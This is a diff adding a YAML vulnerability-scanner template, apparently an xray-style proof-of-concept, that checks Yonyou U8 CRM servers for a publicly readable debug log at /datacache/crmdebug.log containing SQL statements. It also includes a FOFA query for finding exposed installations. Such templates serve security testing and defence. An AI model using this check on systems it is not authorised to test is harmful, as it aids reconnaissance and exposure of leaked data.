@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-u8crm-log-information-leak
+info:
+  name: 用友u8CRM 日志信息泄露
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+requests:
+- method: GET
+  path: /datacache/crmdebug.log
+  expression: 'status_code == 200 &&
+
+    contains(headers,"text/plain") &&
+
+    contains(body,"ErrorMessage") &&
+
+    contains(body,"SELECT") &&
+
+    contains(body,"UPDATE") &&
+
+    matches(body,"\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}")
+
+    '
+variables: {}
+transport: http
